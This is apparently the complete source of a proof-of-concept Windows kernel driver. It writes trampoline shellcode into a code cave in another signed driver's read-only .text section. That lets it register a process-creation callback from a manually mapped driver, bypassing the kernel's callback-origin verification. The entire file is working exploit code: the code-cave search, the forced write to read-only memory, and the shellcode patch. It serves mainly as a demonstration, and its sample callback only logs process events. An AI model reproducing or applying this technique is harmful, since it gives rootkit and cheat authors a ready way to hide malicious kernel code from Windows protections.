#include "main.h"

PCREATE_PROCESS_NOTIFY_ROUTINE trampoline = 0;

BYTE shellcode[] =
{
	0x50,                                                        // push rax
	0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rax, TARGET
	0x48, 0x87, 0x04, 0x24,                                      // xchg QWORD PTR[rsp], rax
	0xC3                                                         // ret
};

PRTL_PROCESS_MODULES GetModuleList()
{
	ULONG buffer_size = 0;

	NTSTATUS status = ZwQuerySystemInformation(SystemModuleInformation, &buffer_size, 0, &buffer_size);
	if (!buffer_size)
		return NULL;

	buffer_size *= 2;

	auto module_list = reinterpret_cast<PRTL_PROCESS_MODULES>(ExAllocatePool((POOL_TYPE)(PagedPool | POOL_COLD_ALLOCATION), buffer_size));
	if (!module_list)
		return NULL;

	if (NT_SUCCESS(status = ZwQuerySystemInformation(SystemModuleInformation, module_list, buffer_size, &buffer_size)))
		return module_list;

	ExFreePool(module_list);
	return NULL;
}

VOID ToLower(IN CHAR* in, OUT CHAR* out)
{
	INT i = -1;

	while (in[++i] != '\x00')
	{
		out[i] = (CHAR)tolower(in[i]);
	}
}

UINT_PTR LookupCodecave(IN VOID* module_base, IN INT required_size)
{
	auto* dos_header = reinterpret_cast<IMAGE_DOS_HEADER*>(module_base);
	auto* nt_headers = reinterpret_cast<IMAGE_NT_HEADERS*>(((BYTE*)dos_header + dos_header->e_lfanew));

	UINT_PTR start = 0, size = 0;

	UINT_PTR header_offset = (UINT_PTR)IMAGE_FIRST_SECTION(nt_headers);

	for (auto x = 0; x < nt_headers->FileHeader.NumberOfSections; ++x)
	{
		auto* header = reinterpret_cast<IMAGE_SECTION_HEADER*>(header_offset);

		if (strcmp((CHAR*)header->Name, ".text") == 0)
		{
			start = (UINT_PTR)module_base + header->PointerToRawData;
			size = header->SizeOfRawData;
			break;
		}

		header_offset += sizeof(IMAGE_SECTION_HEADER);
	}

	UINT_PTR match = 0;
	INT cur_length = 0;

	for (auto cur = start; cur < start + size; ++cur)
	{
		if (*(BYTE*)cur == 0xCC)
		{
			if (!match)
				match = cur;

			if (++cur_length == required_size)
				return match;
		}
		else
			match = cur_length = 0;
	}

	return NULL;
}

BOOLEAN WriteToReadOnlyMemory(IN VOID* destination, IN VOID* source, IN ULONG size)
{
	PMDL mdl = IoAllocateMdl(destination, size, FALSE, FALSE, 0);
	if (!mdl)
		return FALSE;

	MmProbeAndLockPages(mdl, KernelMode, IoReadAccess);

	PVOID map_address = MmMapLockedPagesSpecifyCache(mdl, KernelMode, MmNonCached, 0, FALSE, NormalPagePriority);
	if (!map_address)
	{
		MmUnlockPages(mdl);
		IoFreeMdl(mdl);
		return FALSE;
	}

	NTSTATUS status = MmProtectMdlSystemAddress(mdl, PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(status))
	{
		MmUnmapLockedPages(map_address, mdl);
		MmUnlockPages(mdl);
		IoFreeMdl(mdl);
		return FALSE;
	}

	RtlCopyMemory(map_address, source, size);

	MmUnmapLockedPages(map_address, mdl);
	MmUnlockPages(mdl);
	IoFreeMdl(mdl);
	return TRUE;
}

NTSTATUS SetCreateProcessNotifyRoutine(IN PCREATE_PROCESS_NOTIFY_ROUTINE NotifyRoutine, OUT PCREATE_PROCESS_NOTIFY_ROUTINE* TrampolineBase)
{
	NTSTATUS status;

	// Get a list of all loaded modules
	PRTL_PROCESS_MODULES modules = GetModuleList();
	if (!modules)
	{
		log("GetModuleList() failed");
		return STATUS_UNSUCCESSFUL;
	}

	UINT_PTR found_address = 0;
	char driver_name[0x100] = { 0 };

	// Iterate them all to find a suitable code cave for our shellcode
	for (auto i = 1; i < modules->NumberOfModules; ++i)
	{
		auto* module = &modules->Modules[i];
		ToLower((CHAR*)module->FullPathName, driver_name);

		// Filter a bit
		if (strlen(driver_name) < 10 || !strstr(driver_name + strlen(driver_name) - 5, ".sys") || strstr(driver_name, "win32kbase") || strstr(driver_name, "clfs"))
			continue;

		// Try to find a suitable code cave, stop iterating if so
		if (found_address = LookupCodecave(module->ImageBase, sizeof(shellcode)))
		{
			log("Found codecave in %s", driver_name + module->OffsetToFileName);
			break;
		}
	}

	// This is not supposed to happen
	if (!found_address)
	{
		log("Unable to find any suitable code cave, aborting...");
		return STATUS_UNSUCCESSFUL;
	}

	//	Prepare shellcode with our routine address
	*(UINT_PTR*)(shellcode + 3) = (UINT_PTR)NotifyRoutine;

	// Write shellcode in the found code cave
	if (!WriteToReadOnlyMemory((VOID*)found_address, shellcode, sizeof(shellcode)))
	{
		log("WriteToReadOnlyMemory failed");
		return STATUS_UNSUCCESSFUL;
	}

	// Out address
	*TrampolineBase = (PCREATE_PROCESS_NOTIFY_ROUTINE)found_address;

	// Call PsSetCreateProcessNotifyRoutine to register the callback
	if (!NT_SUCCESS(status = PsSetCreateProcessNotifyRoutine((PCREATE_PROCESS_NOTIFY_ROUTINE)found_address, FALSE)))
	{
		log("PsSetCreateProcessNotifyRoutine failed with status 0x%X", status);
		return status;
	}

	// Ok
	log("SetCreateProcessNotifyRoutine succeeded");
	return STATUS_SUCCESS;
}

NTSTATUS UnSetCreateProcessNotifyRoutine(IN PCREATE_PROCESS_NOTIFY_ROUTINE TrampolineBase)
{
	// First we unregister the callback right way
	NTSTATUS status = PsSetCreateProcessNotifyRoutine(TrampolineBase, TRUE);
	if (!NT_SUCCESS(status))
	{
		log("PsSetCreateProcessNotifyRoutine failed with status 0x%X", status);
		return status;
	}

	// Now we want to restore the original bytes where we wrote the trampoline
	auto pool = ExAllocatePool(NonPagedPool, sizeof(shellcode));
	if (!pool)
	{
		log("ExAllocatePool failed");
		return STATUS_UNSUCCESSFUL;
	}

	// Fill the buffer with 0xCC
	memset(pool, 0xCC, sizeof(shellcode));

	// Write buffer
	if (!WriteToReadOnlyMemory(TrampolineBase, pool, sizeof(shellcode)))
	{
		log("WriteToReadOnlyMemory failed");
		ExFreePool(pool);
		return STATUS_UNSUCCESSFUL;
	}

	// Free previously allocated buffer
	ExFreePool(pool);

	// Ok
	log("UnSetCreateProcessNotifyRoutine succeeded");
	return STATUS_SUCCESS;
}

VOID CreateProcessNotifyRoutine(HANDLE ParentId, HANDLE ProcessId, BOOLEAN Create)
{
	log("CreateProcessNotifyRoutine(%d, %d, %s)", ParentId, ProcessId, Create != FALSE ? "TRUE" : "FALSE");
}

VOID Sleep(LONGLONG milliseconds)
{
	LARGE_INTEGER timeout;
	timeout.QuadPart = RELATIVE(MILLISECONDS(milliseconds));
	KeDelayExecutionThread(KernelMode, FALSE, &timeout);
}

VOID PoofOfConcept()
{
	// First, let's try to call PsSetCreateProcessNotifyRoutine
	// STATUS_ACCESS_DENIED expected because of MmVerifyCallbackFunctionCheckFlags!

	NTSTATUS status = PsSetCreateProcessNotifyRoutine(CreateProcessNotifyRoutine, FALSE);
	log("PsSetCreateProcessNotifyRoutine returned 0x%X (expected 0x%X)", status, STATUS_ACCESS_DENIED);
	if (NT_SUCCESS(status))
	{
		PsSetCreateProcessNotifyRoutine(CreateProcessNotifyRoutine, TRUE);
	}

	// Register the callback
	if (!NT_SUCCESS(status = SetCreateProcessNotifyRoutine(CreateProcessNotifyRoutine, &trampoline)))
	{
		log("SetCreateProcessNotifyRoutine failed with status 0x%X", status);
		return;
	}

	// Ok
	log("Successfully registered notify routine, trampoline at 0x%p", trampoline);
	log("Notify routine will be unregistered in 5 seconds...");

	// Wait a bit
	Sleep(5 * 1000);
	log("Unregistering routine...");

	// Unregister the callback
	status = UnSetCreateProcessNotifyRoutine(trampoline);
	if (!NT_SUCCESS(status))
	{
		log("UnSetCreateProcessNotifyRoutine failed with status 0x%X", status);
		return;
	}

	log("Successfully unregistered notify routine");
}

EXTERN_C NTSTATUS DriverEntry(IN PVOID AllocationBase, IN DWORD32 AllocationSize)
{
	log("DriverEntry(0x%p, 0x%X)", AllocationBase, AllocationSize);

	HANDLE thread_handle;
	NTSTATUS status = PsCreateSystemThread(&thread_handle, THREAD_ALL_ACCESS, NULL, NULL, NULL, (KSTART_ROUTINE*)PoofOfConcept, NULL);
	if (!NT_SUCCESS(status))
	{
		log("PsCreateSystemThread failed with status 0x%X", status);
		return status;
	}

	if (thread_handle)
		ZwClose(thread_handle);
	return STATUS_SUCCESS;
}
